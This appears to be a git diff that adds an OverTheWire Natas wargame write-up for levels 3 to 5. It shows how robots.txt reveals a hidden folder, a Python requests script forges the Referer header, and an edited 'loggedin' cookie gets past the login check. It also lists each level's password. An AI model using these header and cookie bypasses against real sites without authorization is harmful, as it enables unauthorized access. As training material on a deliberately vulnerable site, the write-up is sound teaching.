@@ -39,3 +39,93 @@ Just remove the filename and check <http://natas2.natas.labs.overthewire.org/fil
 ```bash
 natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
 ```
+
+## Natas 03 Solution
+
+> **URL : URL : <http://natas3.natas.labs.overthewire.org>** <br /> **Credentials : natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14**
+
+In practice, **robots.txt** files indicate whether certain user agents can or cannot crawl parts of a website. Nowadays, it exists on most of the websites.
+
+Let’s check the robots.txt file on this page (<http://natas3.natas.labs.overthewire.org/robots.txt>), you’ll find the folder containing the password :
+
+```bash
+User-agent: *
+Disallow: /s3cr3t/
+```
+
+Browse the folder, and check the **users.txt** file.
+
+```bash
+natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+```
+
+## Natas 04 Solution
+
+> **URL : URL : <http://natas4.natas.labs.overthewire.org>** <br /> **Credentials : natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ**
+
+When you try to login, you get the following error message:
+
+```python
+Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
+```
+
+You can solve this one by changing the referer of the request with a simple Python script:
+
+```python
+import requests
+
+url = "http://natas4.natas.labs.overthewire.org/"
+referer = "http://natas5.natas.labs.overthewire.org/"
+
+s = requests.Session()
+s.auth = ('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
+s.headers.update({'referer': referer})
+r = s.get(url)
+
+print(r.text)
+```
+
+Grab the password and go to the next level :
+
+```bash
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+```
+
+## Natas 05 Solution
+
+> **URL : URL : <http://natas5.natas.labs.overthewire.org>** <br /> **Credentials : natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq**
+
+When we try to login, we get the following error message :
+
+```python
+Access disallowed. You are not logged in
+```
+
+Let’s check the headers of the HTTP response with Python :
+
+```python
+import requests
+
+url = "http://natas5.natas.labs.overthewire.org/"
+s = requests.Session()
+s.auth = ('natas5', 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')
+r = s.get(url)
+
+print(r.headers)
+```
+
+Here is the response :
+
+```json
+{'Date': 'Fri, 29 Mar 2019 20:18:20 GMT', 'Server': 'Apache/2.4.10 (Debian)', 'Set-Cookie': 'loggedin=0', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '367', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
+```
+
+As we can see we got a cookie **‘Set-Cookie’: ‘loggedin=0’**. We can try to modify it with the value **1** and refresh the page. This can be done directly in **Chrome** by using the Javascript Console.
+
+![alt text](https://axcheron.github.io/images/otw/edit_cookie.png)
+
+Done !
+
+```python
+Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1s
+```
